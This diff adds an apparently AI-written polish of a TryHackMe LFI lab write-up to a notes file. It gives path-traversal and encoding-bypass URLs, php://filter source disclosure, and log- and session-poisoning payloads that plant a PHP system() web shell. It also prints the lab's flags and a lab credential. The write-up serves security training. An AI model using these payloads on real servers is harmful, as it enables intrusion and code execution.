@@ -1,6 +1,170 @@
 #Key Takeaway
 LFI (local file inclusion) vulnerability then make it to takeover become RCE(Remote Code Execution)
-for LFI
+Got it 👍 thanks for sharing your whole write-up.
+I read through carefully — your overall flow is **good and logical**, but some parts are a bit **mixed or unclear** (you sometimes blend the general concept, the TryHackMe “Day 6” task flow, and your own notes).
+
+Here’s a **review + correction / polish** of your write-up:
+
+---
+
+# ✅ Corrected & Polished Write-Up
+
+## 1. Local File Inclusion (LFI)
+
+**Definition**
+A Local File Inclusion (LFI) vulnerability occurs when a web application includes files based on unsanitized user input. In PHP, vulnerable functions include:
+
+* `include`
+* `require`
+* `include_once`
+* `require_once`
+
+Example vulnerable code:
+
+```php
+<?php
+  include($_GET["file"]);
+?>
+```
+
+An attacker can manipulate the `file` parameter to include sensitive files.
+
+**Basic Exploitation**
+
+```http
+http://example.thm.labs/index.php?file=welcome.txt
+http://example.thm.labs/page.php?file=/etc/passwd
+http://example.thm.labs/page.php?file=../../../../../../etc/passwd
+http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00
+http://example.thm.labs/page.php?file=....//....//....//etc/passwd
+http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
+```
+
+**Target files of interest:**
+
+* `/etc/passwd`
+* `/etc/shadow`
+* `/etc/hosts`
+* `/proc/self/environ`
+* `/proc/version`
+* `/proc/cmdline`
+* `/var/www/html/...` (application source files)
+
+---
+
+## 2. PHP Wrappers
+
+When including PHP files, normally you only see the *executed output* (not raw source).
+To bypass this, use the **PHP filter wrapper** to get encoded content:
+
+```http
+http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=index.php
+```
+
+Decode the Base64 to view the raw PHP source.
+
+Example: If you discover `./include/credential.php`, you can do:
+
+```http
+http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=./include/credential.php
+```
+
+---
+
+## 3. From LFI to RCE
+
+### a) Log Poisoning
+
+If the application logs user input (e.g., User-Agent), you can inject PHP code:
+
+```bash
+curl -A "<?php system($_GET['cmd']); ?>" http://example.thm.labs/login.php
+```
+
+Then include the log file via LFI:
+
+```http
+http://example.thm.labs/page.php?file=../../../../../../var/www/html/includes/logs/app_access.log&cmd=whoami
+```
+
+→ Executes `whoami` on the server.
+
+### b) Session Poisoning
+
+If PHP sessions are stored in `/tmp`, you can inject PHP payloads into your session:
+
+1. Get your `PHPSESSID` from browser cookies. Example:
+
+   ```
+   PHPSESSID=vc4567al6pq7usm2cufmilkm45
+   ```
+
+   → Session file will be `/tmp/sess_vc4567al6pq7usm2cufmilkm45`.
+
+2. Inject PHP code into username field (or any session-stored value). Example:
+
+   ```
+   <?php system($_GET['cmd']); ?>
+   ```
+
+3. Trigger with LFI:
+
+   ```http
+   http://example.thm.labs/page.php?file=/tmp/sess_vc4567al6pq7usm2cufmilkm45&cmd=id
+   ```
+
+---
+
+## 4. TryHackMe Task Walkthrough
+
+* **Entry point parameter:** `err` ✅
+* **Read `/etc/flag`:** `THM{d29e08941cf7fe41df55f1a7da6c4c06}` ✅
+* **Read `index.php` with PHP filter → find `$flag`:** `THM{791d43d46018a0d89361dbf60d5d9eb8}` ✅
+* **Read credential file (./include/credential.php):**
+
+  ```
+  McSkidy:A0C315Aw3s0m
+  ```
+* **Login and retrieve recovery password:**
+  `THM{552f313b52e3c3dbf5257d8c6db7f6f1}` ✅
+* **RCE via log poisoning → hostname:**
+  `lfi-aoc-awesome-59aedca683fff9261263bb084880c965` ✅
+
+---
+
+## 🔑 Key Takeaway
+
+* **LFI** = lets you include files → info disclosure.
+* **Wrappers** (php\://filter, data://) help bypass execution.
+* **Log poisoning / session poisoning** can chain LFI into **RCE**.
+* Always sanitize input and disable dangerous PHP functions.
+
+---
+
+👉 Your original write-up had **the right logic**, but you:
+
+* Mixed examples with the actual TryHackMe task answers (making it harder to follow).
+* Wrote the RCE log poisoning example a bit messy (`curl -A "<?php echo "anyhing"; system($_GET['anyvalue']);?>"`) → corrected to a clean payload.
+* Forgot to separate **general LFI theory** vs **task answers** clearly.
+
+---
+
+Do you want me to **restructure it into a neat “report style” format** (intro, methodology, exploitation, mitigation, conclusion), so you can submit it as a proper assignment write-up?
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
